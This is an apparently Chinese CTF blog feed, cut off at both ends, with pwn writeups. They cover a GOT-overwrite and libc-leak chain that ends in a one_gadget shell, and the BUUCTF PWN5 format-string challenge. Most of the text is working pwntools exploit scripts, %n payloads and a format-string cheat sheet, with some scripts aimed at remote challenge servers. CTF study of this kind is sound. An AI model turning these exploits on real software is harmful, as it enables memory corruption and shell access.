process(argv=[myld.path,myelf.path],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : mylibc.path&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aaw</span>(<span class="params">addr,value</span>):</span></span><br><span class="line">    p_size  = <span class="string">b&quot;9$saaabb&quot;</span>+ p64(addr)[:-<span class="number">1</span>]       <span class="comment"># scanf(&quot;%15s&quot;, size); only handle 15 char</span></span><br><span class="line">    myio.sendlineafter(<span class="string">&quot;size: &quot;</span>,p_size)</span><br><span class="line">    myio.sendlineafter(<span class="string">&quot;data: &quot;</span>,value)</span><br><span class="line"></span><br><span class="line">gdb.attach(myio,<span class="string">&quot;b *0x40132b \n c&quot;</span>)  </span><br><span class="line"></span><br><span class="line">payload1 = p64(<span class="number">0x401256</span>)[:-<span class="number">1</span>]    <span class="comment"># return main ,需要注意，任意地址写的时候，要密切关注被写位置是否超范围覆盖。比如这里如果不在最后加[:-1]的话就会将后一个got表项（__ctype_b_loc）写坏。导致再次进main函数后，执行出错</span></span><br><span class="line"><span class="comment"># payload2 = p64(0x401170)[:-1]    # return start </span></span><br><span class="line">aaw(<span class="number">0x404058</span>,payload1)      <span class="comment"># exit_got: 0x404058</span></span><br><span class="line">myio.interactive()</span><br></pre></td></tr></table></figure><h5 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用任意地址写能力将 setbuf(stderr, NULL); 修改为 puts(snprintf_got) 。当程序重新执行start()时，执行 setbuf(stderr, NULL); 时实际上在执行puts(snprintf_got)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">myelf = ELF(<span class="string">&quot;./bin/chall&quot;</span>)</span><br><span class="line">mylibc = ELF(<span class="string">&quot;./lib/libc.so.6&quot;</span>)</span><br><span class="line">myld = ELF(<span class="string">&quot;./lib/ld-2.31.so&quot;</span>)</span><br><span class="line">myio = process(argv=[myld.path,myelf.path],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : mylibc.path&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aaw</span>(<span class="params">addr,value</span>):</span></span><br><span class="line">    p_size  = <span class="string">b&quot;9$saaabb&quot;</span>+ p64(addr)[:-<span class="number">1</span>]       <span class="comment"># scanf(&quot;%15s&quot;, size); only handle 15 char</span></span><br><span class="line">    myio.sendlineafter(<span class="string">&quot;size: &quot;</span>,p_size)</span><br><span class="line">    myio.sendlineafter(<span class="string">&quot;data: &quot;</span>,value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(myio,&quot;b *0x40132b \n c&quot;)  # 2nd scanf</span></span><br><span class="line"><span class="comment"># gdb.attach(myio,&quot;b *0x401379 \n c&quot;)  # setbuf</span></span><br><span class="line"></span><br><span class="line">payload1 = p64(<span class="number">0x401256</span>)[:-<span class="number">1</span>]    <span class="comment"># return main</span></span><br><span class="line">aaw(<span class="number">0x404058</span>,payload1)      <span class="comment"># exit_got: 0x404058</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set stderr ,set setbuf_got</span></span><br><span class="line">aaw(<span class="number">0x4040a0</span>,p64(<span class="number">0x404030</span>)[:-<span class="number">1</span>])   <span class="comment"># change: 0x4040a0 —▸ 0x404030 —▸ 0x7f90a4f14d60 (snprintf)</span></span><br><span class="line">aaw(<span class="number">0x40401f</span>,<span class="string">&quot;\x00\xd0\x10\x40\x00\x00\x00\x00&quot;</span>)                    <span class="comment">#  让地址0x404020处为0x4010d0，往前偏移1字节写入</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># to exec setbuf(stderr) = puts(snprintf_got)</span></span><br><span class="line">payload1 = p64(<span class="number">0x401170</span>)[:-<span class="number">1</span>]    <span class="comment"># return start </span></span><br><span class="line">aaw(<span class="number">0x404058</span>,payload1)      <span class="comment"># exit_got: 0x404058</span></span><br><span class="line"></span><br><span class="line">myio.recvline()<span class="comment"># puts(stdin)</span></span><br><span class="line">myio.recvline()<span class="comment"># puts(stdout)</span></span><br><span class="line">libc_snprintf = u64(myio.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))<span class="comment"># puts(snprintf_got)</span></span><br><span class="line">libc_base = libc_snprintf - <span class="number">0x61d60</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">myio.interactive()</span><br></pre></td></tr></table></figure><h5 id="调用execve-“-bin-sh”-参数2-参数2"><a href="#调用execve-“-bin-sh”-参数2-参数2" class="headerlink" title="调用execve(“/bin/sh”,参数2,参数2);"></a>调用execve(“/bin/sh”,参数2,参数2);</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ one_gadget ./lib/libc.so.6</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">myelf = ELF(<span class="string">&quot;./bin/chall&quot;</span>)</span><br><span class="line">mylibc = ELF(<span class="string">&quot;./lib/libc.so.6&quot;</span>)</span><br><span class="line">myld = ELF(<span class="string">&quot;./lib/ld-2.31.so&quot;</span>)</span><br><span class="line">myio = process(argv=[myld.path,myelf.path],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : mylibc.path&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aaw</span>(<span class="params">addr,value</span>):</span></span><br><span class="line">    p_size  = <span class="string">b&quot;9$saaabb&quot;</span>+ p64(addr)[:-<span class="number">1</span>]      <span class="comment"># scanf(&quot;%15s&quot;, size); only handle 15 char</span></span><br><span class="line">    myio.sendlineafter(<span class="string">&quot;size: &quot;</span>,p_size)</span><br><span class="line">    myio.sendlineafter(<span class="string">&quot;data: &quot;</span>,value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(myio,&quot;b *0x40132b \n c&quot;)  # 2nd scanf</span></span><br><span class="line"><span class="comment"># gdb.attach(myio,&quot;b *0x401379 \n c&quot;)  # setbuf</span></span><br><span class="line"></span><br><span class="line">payload1 = p64(<span class="number">0x401256</span>)[:-<span class="number">1</span>]    <span class="comment"># return main</span></span><br><span class="line">aaw(<span class="number">0x404058</span>,payload1)      <span class="comment"># exit_got: 0x404058</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set stderr ,set setbuf_got</span></span><br><span class="line">aaw(<span class="number">0x4040a0</span>,p64(<span class="number">0x404030</span>)[:-<span class="number">1</span>])   <span class="comment"># change: 0x4040a0 —▸ 0x404030 —▸ 0x7f90a4f14d60 (snprintf)</span></span><br><span class="line">aaw(<span class="number">0x40401f</span>,<span class="string">&quot;\x00\xd0\x10\x40\x00\x00\x00\x00&quot;</span>)    <span class="comment"># 让地址0x404020处为0x4010d0，往前偏移1字节写入</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># to exec setbuf(stderr) = puts(snprintf_got)</span></span><br><span class="line">payload1 = p64(<span class="number">0x401170</span>)[:-<span class="number">1</span>]    <span class="comment"># return start </span></span><br><span class="line">aaw(<span class="number">0x404058</span>,payload1)      <span class="comment"># exit_got: 0x404058</span></span><br><span class="line"></span><br><span class="line">myio.recvline()    <span class="comment"># puts(stdin)</span></span><br><span class="line">myio.recvline()    <span class="comment"># puts(stdout)</span></span><br><span class="line">libc_snprintf = u64(myio.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) <span class="comment"># puts(snprintf_got)</span></span><br><span class="line">libc_base = libc_snprintf - <span class="number">0x61d60</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload1 = p64(libc_base+<span class="number">0xe3b01</span>)[:-<span class="number">1</span>]    <span class="comment"># exec /bin/sh</span></span><br><span class="line">aaw(<span class="number">0x404058</span>,payload1)      <span class="comment"># exit_got: 0x404058</span></span><br><span class="line"></span><br><span class="line">myio.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">ctf题</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>BUUctf</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/09/15/BUUctf/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/09/15/BUUctf/</id>
    <published>2022-09-15T02:40:15.000Z</published>
    <updated>2022-09-22T14:59:36.846Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">一级标题：<span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span>&gt;</span> pwn <span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">二级标题：<span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;green&quot;</span>&gt;</span> 格式化字符串漏洞 <span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">三级标题：<span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;orange&quot;</span>&gt;</span> [第五空间2019 决赛]PWN5 <span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"></span><br><span class="line">4空格缩进：<span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span></span><br><span class="line">8空格缩进：<span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span></span><br></pre></td></tr></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title=" pwn "></a><center><font color="red"> pwn </font></center></h1><h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title=" 格式化字符串漏洞 "></a><center><font color="green"> 格式化字符串漏洞 </font></center></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">栈数据读：</span><br><span class="line">  AAAA %08x %08x %08x %08x %08x %08x %08x %08x</span><br><span class="line">  AAAA_%08x_%08x_%08x_%08x_%08x_%08x_%08x_%08x</span><br><span class="line">  AAAA %p %p %p %p %p %p %p %p</span><br><span class="line">  AAAA_%p_%p_%p_%p_%p_%p_%p_%p</span><br><span class="line">    </span><br><span class="line">泄露任意地址：</span><br><span class="line">  addr%k$s   k偏移、addr地址</span><br><span class="line">    </span><br><span class="line">任意地址写：</span><br><span class="line">  [addr of c]%012d%6$n    </span><br><span class="line">  addr of c 的长度为4,故而我们得再输入12个字符才可以达到16个字符,以便于来修改c的值为16。</span><br><span class="line">  </span><br><span class="line">  payload=p32(0x804c044)+p32(0x804c045)+p32(0x804c046)+p32(0x804c047)</span><br><span class="line">  payload+=&#x27;%10$n%11$n%12$n%13$n&#x27;</span><br><span class="line"> </span><br><span class="line">  %lln :8字节</span><br><span class="line">  %n   :4字节</span><br><span class="line">  %hn  :2字节</span><br><span class="line">  %hhn :1字节</span><br><span class="line">  </span><br><span class="line">  </span><br></pre></td></tr></table></figure><h3 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title=" [第五空间2019 决赛]PWN5 "></a><center><font color="orange"> [第五空间2019 决赛]PWN5 </font></center></h3><p>题目链接：[BUUCTF在线评测 (buuoj.cn)](<a href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019">https://buuoj.cn/challenges#[第五空间2019</a> 决赛]PWN5)</p><p>参考链接1：[<a href="https://blog.csdn.net/BangSen1/article/details/115191602">BUUCTF]PWN——[第五空间2019 决赛]PWN5_HAIANAWEI的博客-CSDN博客</a></p><p>参考链接2：[buuctf——<a href="https://blog.csdn.net/qq_41560595/article/details/114916869">第五空间2019 决赛]PWN5 1_云啾啾啾的博客-CSDN博客</a></p><p>参考链接3：[<a href="https://blog.csdn.net/qq_41696518/article/details/125771666?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-125771666-blog-114916869.pc_relevant_multi_platform_whitelistv6&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-125771666-blog-114916869.pc_relevant_multi_platform_whitelistv6&utm_relevant_index=1">第五空间2019 决赛]PWN5 ——两种解法_Mokapeng的博客-CSDN博客_pwn5 第五空间</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">分析&amp;思路1：</span><br><span class="line">    1、源程序大意是把随机数放入到bss段的0x804c044处，用户输入用户名和密码，如果密码和随机数相等，则拿到权限。</span><br><span class="line">    2、程序中存在格式化字符串漏洞，我们可以通过任意写将bss段0x804c044处的密码修改为我们的输入值</span><br><span class="line"></span><br><span class="line">分析&amp;思路2：</span><br><span class="line">    1、通过格式化字符串漏洞带来的任意写权限将aoti()函数地址修改为system()地址，执行system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br></pre></td></tr></table></figure><br/><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">参考脚本<span class="number">1</span>：(对应参考链接<span class="number">1</span>)</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26959</span>)</span><br><span class="line"></span><br><span class="line">payload=p32(<span class="number">0x804c044</span>)+p32(<span class="number">0x804c045</span>)+p32(<span class="number">0x804c046</span>)+p32(<span class="number">0x804c047</span>)</span><br><span class="line">payload+=<span class="string">&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">0x10101010</span>))</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line">个人理解：</span><br><span class="line">  <span class="number">1.</span> 先将地址数据<span class="number">0x804c044</span>、<span class="number">0x804c045</span>、<span class="number">0x804c046</span>、<span class="number">0x804c047</span>排部到栈上</span><br><span class="line">  <span class="number">2.</span> 偏移值为<span class="number">10</span>(此处偏移值是指程序输入name时，通过AAAA %08x %08x ... %08x这串字符，看看第几个%08x能打印出AAAA的值<span class="number">0x41414141</span>，也就是printf向栈上写入数据的栈地址，测试发现第十个%08x能打印出<span class="number">0x41414141</span>所以偏移值为<span class="number">10</span>)</span><br><span class="line">  <span class="number">3.</span> 又因为p32(<span class="number">0x804c044</span>)+p32(<span class="number">0x804c045</span>)+p32(<span class="number">0x804c046</span>)+p32(<span class="number">0x804c047</span>)这串字符长度为<span class="number">16</span>字节，每个地址<span class="number">4</span>字节，所以通过%n向目标地址写入的数据为<span class="number">0x10</span></span><br><span class="line">  <span class="number">4.</span> %<span class="number">10</span>$n的意思是向偏移值<span class="number">10</span>的栈上存储的地址处写入数据<span class="number">0x10</span>，偏移<span class="number">10</span>的地址为<span class="number">0x804c044</span></span><br><span class="line">     %<span class="number">13</span>$n的意思是向偏移值<span class="number">13</span>的栈上存储的地址处写入数据<span class="number">0x10</span>，偏移<span class="number">13</span>的地址为<span class="number">0x804c047</span></span><br></pre></td></tr></table></figure><br/><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">参考脚本<span class="number">2</span>：(对应参考链接<span class="number">2</span>)</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28630</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./pwn5&quot;)</span></span><br><span class="line">bss=<span class="number">0x0804c044</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload=<span class="string">b&quot;AAAA%16$n%17$n%18$n%19$n&quot;</span>+p32(bss)+p32(bss+<span class="number">1</span>)+p32(bss+<span class="number">2</span>)+p32(bss+<span class="number">3</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x04040404</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">个人理解：</span><br><span class="line">    <span class="number">1</span>、与参考脚本<span class="number">1</span>类似，只是把栈上数据布置改了一下，思路是一样的</span><br><span class="line">    <span class="number">2</span>、AAAA四个字符在%n前面，所以%n会将<span class="number">0x04</span>写入目标地址</span><br><span class="line">    <span class="number">3</span>、通过%<span class="number">16</span>$、%<span class="number">17</span>$等来表示要写入地址的偏移值</span><br></pre></td></tr></table></figure><p><img src="image-20220915153634079.png" alt="image-20220915153634079"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">参考脚本<span class="number">3</span>：(对应参考链接<span class="number">3</span>)</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25068</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;atoi_got:system_plt&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">作者思路：</span><br><span class="line">  我们可以利用fmtstr_payload修改任意内容，</span><br><span class="line">  fmtstr_payload是pwntools里面的一个工具，可以实现修改任意内存，用来简化对格式化字符串漏洞的构造工作。</span><br><span class="line">    </span><br><span class="line">fmtstr_payload(offset, &#123;printf_got: system_addr&#125;)(偏移，&#123;原地址：目的地址&#125;)</span><br><span class="line">  <span class="number">1</span>、fmtstr_payload(offset, writes, numbwritten=<span class="number">0</span>, write_size=‘byte’)</span><br><span class="line">  <span class="number">2</span>、第一个参数表示格式化字符串的偏移；</span><br><span class="line">  <span class="number">3</span>、第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成&#123;printfGOT:systemAddress&#125;；本题是将0804a048处改为<span class="number">0x2223322</span>   </span><br><span class="line">  <span class="number">4</span>、第三个参数表示已经输出的字符个数，这里没有，为<span class="number">0</span>，采用默认值即可；</span><br><span class="line">  <span class="number">5</span>、第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（<span class="built_in">int</span>），对应着hhn、hn和n，默认值是byte，即按hhn写。</span><br><span class="line">  <span class="number">6</span>、fmtstr_payload函数返回的就是payload</span><br><span class="line"></span><br><span class="line">思路：利用字符串漏洞将判断的atoi直接替换成system，然后手动输入<span class="string">&quot;/bin/sh&quot;</span>字符串，即可达成system(“/<span class="built_in">bin</span>/sh”)目的</span><br></pre></td></tr></table></figure><br/><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">个人脚本<span class="number">1</span>：(分析&amp;思路<span class="number">1</span>)</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25476</span>)</span><br><span class="line"></span><br><span class="line">payload =  <span class="string">b&#x27;AAAAaaaa&#x27;</span>        <span class="comment">#偏移10、11</span></span><br><span class="line">payload += p32(<span class="number">0x0804c044</span>)    <span class="comment">#偏移12</span></span><br><span class="line">payload += p32(<span class="number">0x0804c045</span>)    <span class="comment">#偏移13</span></span><br><span class="line">payload += p32(<span class="number">0x0804c046</span>)    <span class="comment">#偏移14</span></span><br><span class="line">payload += p32(<span class="number">0x0804c047</span>)    <span class="comment">#偏移15</span></span><br><span class="line">payload += <span class="string">b&#x27;%12$n%13$n%14$n%15$n&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">0x18181818</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>%n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</p><br/><h4 id="重点笔记"><a href="#重点笔记" class="headerlink" title="重点笔记"></a>重点笔记</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">个人脚本<span class="number">2</span>：(分析&amp;思路<span class="number">2</span>)</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn5&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,28333)</span></span><br><span class="line"></span><br><span class="line">atoi   = <span class="number">0x0804c034</span>    <span class="comment"># readelf -a pwn5</span></span><br><span class="line">system = <span class="number">0x08049080</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pad1 = 8*b&#x27;a&#x27;</span></span><br><span class="line"><span class="string">pad2 = 4*b&#x27;a&#x27;</span></span><br><span class="line"><span class="string">pad3 = 144*b&#x27;a&#x27;</span></span><br><span class="line"><span class="string">pad4 = 112*b&#x27;a&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload  = p32(0x0804c034)</span></span><br><span class="line"><span class="string">payload += p32(0x0804c035)</span></span><br><span class="line"><span class="string">payload += p32(0x0804c036)</span></span><br><span class="line"><span class="string">payload += p32(0x0804c037)</span></span><br><span class="line"><span class="string">payload += b&#x27;%8c&#x27;+b&#x27;%10$hhn&#x27;</span></span><br><span class="line"><span class="string">payload += b&#x27;%4c&#x27;+b&#x27;%11$hhn&#x27;</span></span><br><span class="line"><span class="string">payload += b&#x27;%144c&#x27;+b&#x27;%12$hhn&#x27;</span></span><br><span class="line"><span class="string">payload += b&#x27;%128c&#x27;+b&#x27;%13$hhn&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x804c034</span>)</span><br><span class="line">payload += p32(<span class="number">0x804c035</span>)</span><br><span class="line">payload += p32(<span class="number">0x804c036</span>)</span><br><span class="line">payload += p32(<span class="number">0x804c037</span>)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">b&#x27;%112c&#x27;</span> + <span class="string">b&#x27;%10$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%16c&#x27;</span> + <span class="string">b&#x27;%11$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%116c&#x27;</span> + <span class="string">b&#x27;%12$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%4c&#x27;</span> + <span class="string">b&#x27;%13$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span 